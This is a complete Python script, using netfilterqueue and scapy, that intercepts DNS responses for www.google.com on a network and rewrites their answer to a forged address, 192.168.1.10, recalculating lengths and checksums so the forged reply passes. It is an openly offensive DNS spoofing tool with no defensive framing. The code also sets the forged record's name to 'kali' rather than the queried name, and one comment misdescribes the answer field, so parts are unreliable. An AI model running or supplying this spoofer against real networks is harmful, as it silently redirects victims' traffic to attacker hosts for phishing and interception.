import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.google.com" in str(qname):
            print("[+] spoofing target")
            answer = scapy.DNSRR(rrname="kali", rdata="192.168.1.10")
            # an is answer it represents the count of dns packets
            scapy_packet[scapy.DNS].an = answer
            # it represents the dns packets count
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            # binding this modified packet scapy packet to the original packet and send as a response
            packet.set_payload(bytes(scapy_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
